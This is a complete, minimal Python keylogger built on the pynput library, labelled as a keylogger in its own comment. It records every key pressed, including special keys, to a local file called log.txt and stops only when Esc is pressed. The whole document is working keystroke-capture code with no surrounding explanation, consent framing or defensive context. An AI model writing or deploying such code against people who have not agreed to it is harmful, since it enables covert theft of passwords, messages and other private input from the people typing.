from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        return False  # Stops the keylogger

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
